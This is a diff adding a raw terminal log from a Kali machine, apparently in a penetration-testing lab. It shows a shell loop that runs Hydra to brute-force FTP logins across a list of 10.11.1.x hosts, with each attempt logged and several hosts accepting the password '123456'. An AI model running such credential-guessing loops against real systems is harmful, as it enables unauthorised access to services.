@@ -1,0 +1,310 @@
+root@kali:~/gen/password# for ips in $(cat ftpips.txt); do hydra -t 1 -l ftp -P /root/gen/password/johnpassword.txt  -vV $ips ftp;done 
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:26:56
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.8 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.8   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.8 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:27:07
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:27:07
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.13 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.13   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.13 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:27:08
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:27:08
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.14 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.14   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.14 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:27:10
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:27:10
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.22 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.22 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+^C[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:27:50
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.115 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.115   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.115 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:28:01
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:28:01
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.116 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[STATUS] attack finished for 10.11.1.116 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:28:19
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:28:19
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.125 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.125   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.125 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:28:20
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:28:20
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "12345" - 2 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "password" - 3 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "password1" - 4 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "123456789" - 5 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "12345678" - 6 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "1234567890" - 7 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "abc123" - 8 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "computer" - 9 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "tigger" - 10 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "1234" - 11 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "qwerty" - 12 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "money" - 13 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "carmen" - 14 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "mickey" - 15 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "secret" - 16 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "summer" - 17 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "internet" - 18 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "a1b2c3" - 19 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "123" - 20 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "service" - 21 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.128 - login "ftp" - pass "" - 22 of 3546 [child 0]
+^C[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:28:27
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "12345" - 2 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "password" - 3 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "password1" - 4 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "123456789" - 5 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "12345678" - 6 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "1234567890" - 7 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "abc123" - 8 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "computer" - 9 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "tigger" - 10 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "1234" - 11 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "qwerty" - 12 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "money" - 13 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "carmen" - 14 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.146 - login "ftp" - pass "mickey" - 15 of 3546 [child 0]
+^C[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:29:16
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.202 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.202   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.202 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:29:27
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:29:27
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "12345" - 2 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "password" - 3 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "password1" - 4 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "123456789" - 5 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.220 - login "ftp" - pass "12345678" - 6 of 3546 [child 0]
+^C[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:29:34
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "12345" - 2 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "password" - 3 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "password1" - 4 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "123456789" - 5 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "12345678" - 6 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "1234567890" - 7 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "abc123" - 8 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "computer" - 9 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "tigger" - 10 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "1234" - 11 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "qwerty" - 12 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "money" - 13 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "carmen" - 14 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "mickey" - 15 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "secret" - 16 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "summer" - 17 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "internet" - 18 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "a1b2c3" - 19 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "123" - 20 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "service" - 21 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "" - 22 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "canada" - 23 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "hello" - 24 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "ranger" - 25 of 3546 [child 0]
+[ATTEMPT] target 10.11.1.226 - login "ftp" - pass "shadow" - 26 of 3546 [child 0]
+^C[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:30:11
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.227 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[21][ftp] host: 10.11.1.227   login: ftp   password: 123456
+[STATUS] attack finished for 10.11.1.227 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-10 10:30:22
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-10 10:30:22
+[DATA] max 1 task per 1 server, overall 64 tasks, 3546 login tries (l:1/p:3546), ~55 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.229 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[VERBOSE] Retrying connection for child 0
+[RE-ATTEMPT] target 10.11.1.229 - login "ftp" - pass "123456" - 1 of 3546 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "12345" - 2 of 3547 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "password" - 3 of 3548 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "password1" - 4 of 3549 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "123456789" - 5 of 3550 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "12345678" - 6 of 3551 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "1234567890" - 7 of 3552 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "abc123" - 8 of 3553 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "computer" - 9 of 3554 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "tigger" - 10 of 3555 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "1234" - 11 of 3556 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "qwerty" - 12 of 3557 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "money" - 13 of 3558 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "carmen" - 14 of 3559 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "mickey" - 15 of 3560 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "secret" - 16 of 3561 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "summer" - 17 of 3562 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "internet" - 18 of 3563 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "a1b2c3" - 19 of 3564 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "123" - 20 of 3565 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "service" - 21 of 3566 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "" - 22 of 3567 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "canada" - 23 of 3568 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "hello" - 24 of 3569 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "ranger" - 25 of 3570 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "shadow" - 26 of 3571 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "baseball" - 27 of 3572 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "donald" - 28 of 3573 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "harley" - 29 of 3574 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "hockey" - 30 of 3575 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "letmein" - 31 of 3576 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "maggie" - 32 of 3577 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "mike" - 33 of 3578 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "mustang" - 34 of 3579 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "snoopy" - 35 of 3580 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "buster" - 36 of 3581 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "dragon" - 37 of 3582 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "jordan" - 38 of 3583 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "michael" - 39 of 3584 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "michelle" - 40 of 3585 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "mindy" - 41 of 3586 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "patrick" - 42 of 3587 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "123abc" - 43 of 3588 [child 0]
+[ERROR] Not an FTP protocol or service shutdown: (null)
+[ATTEMPT] target 10.11.1.229 - login "ftp" - pass "andrew" - 44 of 3589 [child 0]
+^C[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+root@kali:~/gen/password# 
+
